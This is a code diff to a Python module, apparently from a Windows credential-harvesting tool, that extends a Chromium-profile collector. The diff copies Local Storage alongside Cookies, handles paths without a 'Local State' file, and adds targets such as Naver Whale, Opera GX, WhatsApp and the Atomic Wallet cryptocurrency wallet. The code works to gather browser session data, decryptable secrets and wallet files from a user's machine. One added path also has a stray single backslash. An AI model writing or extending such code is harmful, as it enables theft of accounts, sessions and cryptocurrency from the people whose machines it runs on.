@@ -14,8 +14,9 @@ from winsecs.utils import log, CryptUnprotectData
 
 
 class Chromium:
-    def __init__(self, paths):
+    def __init__(self, paths, no_local=[]):
         self.paths = paths if isinstance(paths, list) else [paths]
+        self.no_local = no_local
 
     def db_dirs(self, profile):
         """
@@ -26,7 +27,7 @@ class Chromium:
             path = path.format(**profile)
 
             profiles_path = os.path.join(path, 'Local State')
-            if not os.path.isfile(profiles_path):
+            if not os.path.isfile(profiles_path) and path not in self.no_local:
                 continue
 
             master_key = None
@@ -269,6 +270,10 @@ class Chromium:
                 if os.path.exists(db_path):
                     shutil.copy(db_path, temp)
 
+            db_path = os.path.join(os.path.split(db_path)[0], 'Local Storage')
+            if os.path.exists(db_path):
+                file = shutil.copytree(db_path, temp)
+
             db_path = os.path.join(os.path.split(db_path)[0], 'Cookies')
             if os.path.exists(db_path):
                 file = shutil.copy(db_path, temp)
@@ -325,6 +330,11 @@ browsers_address = {
     'elements browser': '{LOCALAPPDATA}\\Elements Browser\\User Data',
     'epic privacy browser': '{LOCALAPPDATA}\\Epic Privacy Browser\\User Data',
     'google chrome': '{LOCALAPPDATA}\\Google\\Chrome\\User Data',
+    'naver whale': '{LOCALAPPDATA}\\Naver\\Naver Whale\\User Data',
+    'opera neon': '{LOCALAPPDATA}\\Opera Software\Opera Neon\\User Data',
+    'sleipnir': '{APPDATA}\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer',
+    'slimjet': '{LOCALAPPDATA}\\Slimjet\\User Data',
+    'salamweb': '{LOCALAPPDATA}\\SalamWeb\\User Data',
     'kometa': '{LOCALAPPDATA}\\Kometa\\User Data',
     'opera': '{APPDATA}\\Opera Software\\Opera Stable',
     'orbitum': '{LOCALAPPDATA}\\Orbitum\\User Data',
@@ -339,8 +349,14 @@ browsers_address = {
     'ungoogled chromium': '{LOCALAPPDATA}\\Ungoogled Chromium\\User Data',
     'avast secure browser': '{LOCALAPPDATA}\\AVAST Software\\Browser\\User Data',
     'qihoo 360': '{LOCALAPPDATA}\\360Browser\\Browser\\User Data',
-    'cryptotab browser': '{LOCALAPPDATA}\\CryptoTab Browser\\User Data'
+    'cryptotab browser': '{LOCALAPPDATA}\\CryptoTab Browser\\User Data',
+    'atomic wallet': ['{APPDATA}\\atomic', ['{APPDATA}\\atomic']],
+    'colibri': ['{APPDATA}\\Colibri', ['{APPDATA}\\Colibri']],
+    'whatsapp': ['{APPDATA}\\WhatsApp', ['{APPDATA}\\WhatsApp']],
+    'breaker': ['{APPDATA}\\Breaker Browser', ['{APPDATA}\\Breaker Browser']],
+    'falkon': ['{LOCALAPPDATA}\\falkon\\profiles', ['{LOCALAPPDATA}\\falkon\\profiles']],
+    'opera gx': ['{APPDATA}\\Opera Software\\Opera GX Stable', ['{APPDATA}\\Opera Software\\Opera GX Stable']],
 }
 
-modules = {i: Chromium(browsers_address[i]) for i in browsers_address}
+modules = {i: Chromium(*browsers_address[i] if isinstance(browsers_address[i], list) else browsers_address[i]) for i in browsers_address}
 modules["uc browser"] = UCBrowser()
